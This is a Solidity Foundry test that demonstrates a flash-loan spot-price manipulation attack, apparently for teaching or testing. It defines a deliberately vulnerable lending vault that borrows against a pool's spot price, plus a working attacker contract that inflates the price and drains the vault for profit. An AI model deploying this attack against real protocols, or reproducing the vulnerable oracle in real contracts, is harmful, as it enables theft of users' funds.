// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "insufficient allowance");
        allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract MockUniV2Pair {
    MockERC20 public immutable collateral;
    MockERC20 public immutable quote;
    uint256 public reserveCollateral;
    uint256 public reserveQuote;

    constructor(MockERC20 _collateral, MockERC20 _quote) {
        collateral = _collateral;
        quote = _quote;
    }

    function sync() public {
        reserveCollateral = collateral.balanceOf(address(this));
        reserveQuote = quote.balanceOf(address(this));
    }

    function spotPriceQuotePerCollateral() external view returns (uint256) {
        require(reserveCollateral > 0, "empty reserve");
        return (reserveQuote * 1e18) / reserveCollateral;
    }

    function swapQuoteForCollateral(uint256 quoteIn, address to) external returns (uint256 collateralOut) {
        require(quoteIn > 0, "zero quote in");

        uint256 reserveCollateralBefore = reserveCollateral;
        uint256 reserveQuoteBefore = reserveQuote;

        quote.transferFrom(msg.sender, address(this), quoteIn);

        uint256 quoteInWithFee = quoteIn * 997;
        collateralOut = (reserveCollateralBefore * quoteInWithFee) / ((reserveQuoteBefore * 1000) + quoteInWithFee);
        require(collateralOut > 0 && collateralOut < reserveCollateralBefore, "bad output");

        collateral.transfer(to, collateralOut);
        sync();
    }
}

contract VulnerableSpotPriceLendingVault {
    MockERC20 public immutable collateral;
    MockERC20 public immutable debt;
    MockUniV2Pair public immutable pair;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(MockERC20 _collateral, MockERC20 _debt, MockUniV2Pair _pair) {
        collateral = _collateral;
        debt = _debt;
        pair = _pair;
    }

    function depositCollateral(uint256 amount) external {
        collateral.transferFrom(msg.sender, address(this), amount);
        collateralOf[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 spotPrice = pair.spotPriceQuotePerCollateral();
        uint256 maxDebt = (collateralOf[msg.sender] * spotPrice * 50) / (1e18 * 100);
        require(debtOf[msg.sender] + amount <= maxDebt, "insufficient collateral");

        debtOf[msg.sender] += amount;
        debt.transfer(msg.sender, amount);
    }
}

interface IFlashLoanReceiver {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

contract MockFlashLoanPool {
    MockERC20 public immutable token;

    constructor(MockERC20 _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address receiver, bytes calldata data) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= amount, "insufficient pool");

        token.transfer(receiver, amount);
        IFlashLoanReceiver(receiver).onFlashLoan(amount, data);

        require(token.balanceOf(address(this)) >= balanceBefore, "flash loan not repaid");
    }
}

contract FlashLoanPriceManipulator is IFlashLoanReceiver {
    MockERC20 public immutable collateral;
    MockERC20 public immutable quote;
    MockUniV2Pair public immutable pair;
    VulnerableSpotPriceLendingVault public immutable vault;
    MockFlashLoanPool public immutable flashPool;

    constructor(
        MockERC20 _collateral,
        MockERC20 _quote,
        MockUniV2Pair _pair,
        VulnerableSpotPriceLendingVault _vault,
        MockFlashLoanPool _flashPool
    ) {
        collateral = _collateral;
        quote = _quote;
        pair = _pair;
        vault = _vault;
        flashPool = _flashPool;
    }

    function attack(uint256 flashAmount, uint256 borrowAmount) external {
        flashPool.flashLoan(flashAmount, address(this), abi.encode(borrowAmount));
    }

    function onFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == address(flashPool), "unknown lender");
        uint256 borrowAmount = abi.decode(data, (uint256));

        // 1. Borrow quote tokens and swap them into the UniV2-style pair.
        //    This atomically lifts the spot quote/collateral price.
        quote.approve(address(pair), amount);
        uint256 collateralOut = pair.swapQuoteForCollateral(amount, address(this));

        // 2. Deposit the newly purchased collateral while the spot price is inflated.
        collateral.approve(address(vault), collateralOut);
        vault.depositCollateral(collateralOut);

        // 3. Borrow against the manipulated price, then repay the flash loan.
        vault.borrow(borrowAmount);
        quote.transfer(address(flashPool), amount);
    }
}

contract FlashLoanPriceManipTest is Test {
    MockERC20 collateral;
    MockERC20 quote;
    MockUniV2Pair pair;
    VulnerableSpotPriceLendingVault vault;
    MockFlashLoanPool flashPool;
    FlashLoanPriceManipulator attacker;

    function setUp() public {
        collateral = new MockERC20("Collateral", "COL");
        quote = new MockERC20("Dollar", "USD");
        pair = new MockUniV2Pair(collateral, quote);
        vault = new VulnerableSpotPriceLendingVault(collateral, quote, pair);
        flashPool = new MockFlashLoanPool(quote);
        attacker = new FlashLoanPriceManipulator(collateral, quote, pair, vault, flashPool);

        collateral.mint(address(pair), 1_000 ether);
        quote.mint(address(pair), 1_000 ether);
        pair.sync();

        quote.mint(address(vault), 20_000 ether);
        quote.mint(address(flashPool), 5_000 ether);
    }

    function test_flash_loan_spot_price_manipulation_drains_vault() public {
        uint256 priceBefore = pair.spotPriceQuotePerCollateral();
        uint256 flashAmount = 5_000 ether;
        uint256 borrowAmount = 5_500 ether;

        attacker.attack(flashAmount, borrowAmount);

        uint256 priceAfter = pair.spotPriceQuotePerCollateral();
        uint256 attackerProfit = quote.balanceOf(address(attacker));

        assertGt(priceAfter, priceBefore * 30, "spot price should be materially manipulated");
        assertEq(quote.balanceOf(address(flashPool)), flashAmount, "flash loan must be repaid");
        assertEq(vault.debtOf(address(attacker)), borrowAmount, "vault should record inflated debt");
        assertEq(attackerProfit, borrowAmount - flashAmount, "attacker keeps borrowed quote as profit");

        emit log_named_uint("spot price before", priceBefore);
        emit log_named_uint("spot price after", priceAfter);
        emit log_named_uint("attacker profit", attackerProfit);
    }
}
